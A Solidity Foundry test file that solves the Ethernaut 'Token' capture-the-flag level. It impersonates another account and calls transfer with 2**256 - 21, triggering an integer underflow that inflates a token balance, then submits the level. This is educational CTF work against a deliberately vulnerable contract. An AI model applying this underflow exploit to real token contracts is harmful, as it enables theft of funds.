pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Token/TokenFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
  // Sets an address' balance
  function deal(address who, uint256 newBalance) external;
}

contract TokenTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        cheats.deal(eoaAddress, 5 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        cheats.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));
        cheats.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Change accounts from the level was set up with, have to call the transfer function from a different account
        cheats.startPrank(address(1));

        // Transfer maximum amount of tokens without causing an overflow 
        ethernautToken.transfer(eoaAddress, (2**256 - 21));

        // Switch back to original account
        cheats.stopPrank();
        cheats.startPrank(eoaAddress);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        cheats.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}